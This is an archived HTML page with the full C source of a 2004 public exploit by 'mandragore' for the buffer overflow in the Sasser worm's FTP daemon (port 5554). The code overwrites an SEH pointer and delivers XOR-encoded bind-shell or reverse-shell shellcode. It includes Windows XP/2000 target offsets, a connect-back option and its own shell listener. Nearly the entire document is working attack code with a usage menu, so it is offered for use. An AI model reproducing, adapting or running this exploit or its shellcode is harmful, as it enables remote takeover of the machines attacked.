<html><head><title>Sasser Worm ftpd Remote Buffer Overflow Exploit (port 5554)
</title></head><pre>/*
  _________ / ___// ____/ ____/
 / ___/ __ \\__ \/ __/ / /
/ /  / /_/ /__/ / /___/ /___
/_/   \____/____/_____/\____/

- ROMANIAN SECURITY RESEARCH 2004 -


sasser v[a-e] exploit (of its ftpd server)

exploit version 1.4, public

author:  mandragore
date:  Mon May 10 16:13:31     2004
vuln type: SEH ptr overwriting
greets:  rosecurity team
discovery: edcba
note:  sasser.e has its ftpd on port 1023
update:  offsets

*/

#include &lt;stdio.h&gt;
#include &lt;strings.h&gt;
#include &lt;signal.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;

#define NORM  &quot;\033[00;00m&quot;
#define GREEN &quot;\033[01;32m&quot;
#define YELL  &quot;\033[01;33m&quot;
#define RED   &quot;\033[01;31m&quot;

#define BANNER GREEN &quot;[%%] &quot; YELL &quot;mandragore's sploit v1.4 for &quot; RED &quot;sasser.x&quot; NORM

#define fatal(x) { perror(x); exit(1); }

#define default_port 5554

struct { char *os; long goreg; long gpa; long lla;}
targets[] = { 
//  { &quot;os&quot;, pop pop ret, GetProcAd ptr, LoadLib ptr },
 { &quot;wXP SP1 many&quot;, 0x77BEEB23, 0x77be10CC, 0x77be10D0 }, // msvcrt.dll's
 { &quot;wXP SP1 most others&quot;, 0x77C1C0BD, 0x77C110CC, 0x77c110D0 },
 { &quot;w2k SP4 many&quot;, 0x7801D081, 0x780320cc, 0x780320d0 },
}, tsz;

unsigned char bsh[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xDD,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB4,0xDE,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,0x8E,0x8D,0x36,
0xDB,0xDE,0xDE,0xDE,0xBC,0xB7,0xB0,0xBA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0xB4,0xDF,
0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xB2,0xB7,0xAD,0xAA,0xBB,0xB0,0xDE,0x89,0x21,0xC8,
0x21,0x0E,0xB4,0xDE,0x8A,0x8D,0x36,0xD9,0xDE,0xDE,0xDE,0xBF,0xBD,0xBD,0xBB,0xAE,
0xAA,0xDE,0x89,0x21,0xC8,0x21,0x0E,0x55,0x06,0xED,0x1E,0xB4,0xCE,0x87,0x55,0x22,
0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,
0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,
0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,
0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,
0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,
0xC8,0x21,0x0E
};

unsigned char rsh[]={
0xEB,0x0F,0x8B,0x34,0x24,0x33,0xC9,0x80,0xC1,0xB6,0x80,0x36,0xDE,0x46,0xE2,0xFA,
0xC3,0xE8,0xEC,0xFF,0xFF,0xFF,0xBA,0xB9,0x51,0xD8,0xDE,0xDE,0x60,0xDE,0xFE,0x9E,
0xDE,0xB6,0xED,0xEC,0xDE,0xDE,0xB6,0xA9,0xAD,0xEC,0x81,0x8A,0x21,0xCB,0xDA,0xFE,
0x9E,0xDE,0x49,0x47,0x8C,0x8C,0x8C,0x8C,0x9C,0x8C,0x9C,0x8C,0x36,0xD5,0xDE,0xDE,
0xDE,0x89,0x8D,0x9F,0x8D,0xB1,0xBD,0xB5,0xBB,0xAA,0x9F,0xDE,0x89,0x21,0xC8,0x21,
0x0E,0x4D,0xB6,0xA1,0xDE,0xDE,0xDF,0xB6,0xDC,0xDE,0xCA,0x6A,0x55,0x1A,0xB4,0xCE,
0x8E,0x8D,0x36,0xD6,0xDE,0xDE,0xDE,0xBD,0xB1,0xB0,0xB0,0xBB,0xBD,0xAA,0xDE,0x89,
0x21,0xC8,0x21,0x0E,0xB4,0xCE,0x87,0x55,0x22,0x89,0xDD,0x27,0x89,0x2D,0x75,0x55,
0xE2,0xFA,0x8E,0x8E,0x8E,0xB4,0xDF,0x8E,0x8E,0x36,0xDA,0xDE,0xDE,0xDE,0xBD,0xB3,
0xBA,0xDE,0x8E,0x36,0xD1,0xDE,0xDE,0xDE,0x9D,0xAC,0xBB,0xBF,0xAA,0xBB,0x8E,0xAC,
0xB1,0xBD,0xBB,0xAD,0xAD,0x9F,0xDE,0x18,0xD9,0x9A,0x19,0x99,0xF2,0xDF,0xDF,0xDE,
0xDE,0x5D,0x19,0xE6,0x4D,0x75,0x75,0x75,0xBA,0xB9,0x7F,0xEE,0xDE,0x55,0x9E,0xD2,
0x55,0x9E,0xC2,0x55,0xDE,0x21,0xAE,0xD6,0x21,0xC8,0x21,0x0E
};

char verbose=0;

void setoff(long GPA, long LLA) {
int gpa=GPA^0xdededede, lla=LLA^0xdededede;
memcpy(bsh+0x1d,&amp;gpa,4);
memcpy(bsh+0x2e,&amp;lla,4);
memcpy(rsh+0x1d,&amp;gpa,4);
memcpy(rsh+0x2e,&amp;lla,4);
}

void usage(char *argv0) {
int i;

printf(&quot;%s -d &lt;host/ip&gt; [opts]\n\n&quot;,argv0);

printf(&quot;Options:\n&quot;);
printf(&quot; -h undocumented\n&quot;);
printf(&quot; -p &lt;port&gt; to connect to [default: %u]\n&quot;,default_port);
printf(&quot; -s &lt;'bind'/'rev'&gt; shellcode type [default: bind]\n&quot;);
printf(&quot; -P &lt;port&gt; for the shellcode [default: 5300]\n&quot;);
printf(&quot; -H &lt;host/ip&gt; for the reverse shellcode\n&quot;);
printf(&quot; -L setup the listener for the reverse shell\n&quot;);
printf(&quot; -t &lt;target type&gt; [default 0]; choose below\n\n&quot;);

printf(&quot;Types:\n&quot;);
for(i = 0; i &lt; sizeof(targets)/sizeof(tsz); i++)
 printf(&quot; %d %s\t[0x%.8x]\n&quot;, i, targets[i].os, targets[i].goreg);

exit(1);
}

void shell(int s) {
char buff[4096];
int retval;
fd_set fds;

printf(&quot;[+] connected!\n\n&quot;);

for (;;) {
 FD_ZERO(&amp;fds);
 FD_SET(0,&amp;fds);
 FD_SET(s,&amp;fds);

       if (select(s+1, &amp;fds, NULL, NULL, NULL) &lt; 0)
  fatal(&quot;[-] shell.select()&quot;);

 if (FD_ISSET(0,&amp;fds)) {
  if ((retval = read(1,buff,4096)) &lt; 1)
   fatal(&quot;[-] shell.recv(stdin)&quot;);
  send(s,buff,retval,0);
 }

 if (FD_ISSET(s,&amp;fds)) {
  if ((retval = recv(s,buff,4096,0)) &lt; 1)
   fatal(&quot;[-] shell.recv(socket)&quot;);
  write(1,buff,retval);
 }
}
}

void callback(short port) {
struct sockaddr_in sin;
int s,slen=16;

sin.sin_family = 2;
sin.sin_addr.s_addr = 0;
sin.sin_port = htons(port);

s=socket(2,1,6);

if ( bind(s,(struct sockaddr *)&amp;sin, 16) ) {
 kill(getppid(),SIGKILL);
 fatal(&quot;[-] shell.bind&quot;);
}

listen(s,1);

s=accept(s,(struct sockaddr *)&amp;sin,&amp;slen);

shell(s);
printf(&quot;crap\n&quot;);
}

int main(int argc, char **argv, char **env) {
struct sockaddr_in sin;
struct hostent *he;
char *host; int port=default_port;
char *Host; int Port=5300; char bindopt=1;
int i,s,pid=0,rip;
char *buff;
int type=0;
char *jmp[]={&quot;\xeb\x06&quot;,&quot;\xe9\x13\xfc\xff\xff&quot;};

printf(BANNER &quot;\n&quot;);

if (argc==1)
 usage(argv[0]);

for (i=1;i&lt;argc;i+=2) {
 if (strlen(argv[i]) != 2)
  usage(argv[0]);

 switch(argv[i][1]) {
  case 't':
   type=atoi(argv[i+1]);
   break;
  case 'd':
   host=argv[i+1];
   break;
  case 'p':
   port=atoi(argv[i+1])?:default_port;
   break;
  case 's':
   if (strstr(argv[i+1],&quot;rev&quot;))
    bindopt=0;
   break;
  case 'H':
   Host=argv[i+1];
   break;
  case 'P':
   Port=atoi(argv[i+1])?:5300;
   Port=Port ^ 0xdede;
   Port=(Port &amp; 0xff) &lt;&lt; 8 | Port &gt;&gt;8;
   memcpy(bsh+0x57,&amp;Port,2);
   memcpy(rsh+0x5a,&amp;Port,2);
   Port=Port ^ 0xdede;
   Port=(Port &amp; 0xff) &lt;&lt; 8 | Port &gt;&gt;8;
   break;
  case 'L':
   pid++; i--;
   break;
  case 'v':
   verbose++; i--;
   break;
  case 'h':
   usage(argv[0]);
  default:
   usage(argv[0]);
  }
}

if (verbose)
 printf(&quot;verbose!\n&quot;);

if ((he=gethostbyname(host))==NULL)
 fatal(&quot;[-] gethostbyname()&quot;);

sin.sin_family = 2;
sin.sin_addr = *((struct in_addr *)he-&gt;h_addr_list[0]);
sin.sin_port = htons(port);

printf(&quot;[.] launching attack on %s:%d..\n&quot;,inet_ntoa(*((struct in_addr *)he-&gt;h_addr_list[0])),port);
if (bindopt)
 printf(&quot;[.] will try to put a bindshell on port %d.\n&quot;,Port);
else {
 if ((he=gethostbyname(Host))==NULL)
  fatal(&quot;[-] gethostbyname() for -H&quot;);
 rip=*((long *)he-&gt;h_addr_list[0]);
 rip=rip^0xdededede;
 memcpy(rsh+0x53,&amp;rip,4);
 if (pid) {
  printf(&quot;[.] setting up a listener on port %d.\n&quot;,Port);
  pid=fork();
  switch (pid) { case 0: callback(Port); }
 } else
  printf(&quot;[.] you should have a listener on %s:%d.\n&quot;,inet_ntoa(*((struct in_addr 
*)he-&gt;h_addr_list[0])),Port);
}

printf(&quot;[.] using type '%s'\n&quot;,targets[type].os);

// --------------------  core

s=socket(2,1,6);

if (connect(s,(struct sockaddr *)&amp;sin,16)!=0) {
 if (pid) kill(pid,SIGKILL);
 fatal(&quot;[-] connect()&quot;);
}

printf(&quot;[+] connected, sending exploit\n&quot;);

buff=(char *)malloc(4096);
bzero(buff,4096);

sprintf(buff,&quot;USER x\n&quot;);
send(s,buff,strlen(buff),0);
recv(s,buff,4095,0);
sprintf(buff,&quot;PASS x\n&quot;);
send(s,buff,strlen(buff),0);
recv(s,buff,4095,0);

memset(buff+0000,0x90,2000);
strncpy(buff,&quot;PORT &quot;,5);
strcat(buff,&quot;\x0a&quot;);
memcpy(buff+272,jmp[0],2);
memcpy(buff+276,&amp;targets[type].goreg,4);
memcpy(buff+280,jmp[1],5);

setoff(targets[type].gpa, targets[type].lla);

if (bindopt)
 memcpy(buff+300,&amp;bsh,strlen(bsh));
else
 memcpy(buff+300,&amp;rsh,strlen(rsh));

send(s,buff,strlen(buff),0);

free(buff);

close(s);

// --------------------  end of core

if (bindopt) {
 sin.sin_port = htons(Port);
 sleep(1);
 s=socket(2,1,6);
 if (connect(s,(struct sockaddr *)&amp;sin,16)!=0)
  fatal(&quot;[-] exploit most likely failed&quot;);
 shell(s);
}

if (pid) wait(&amp;pid);

exit(0);
}


// milw0rm.com [2004-05-16]</pre></html>
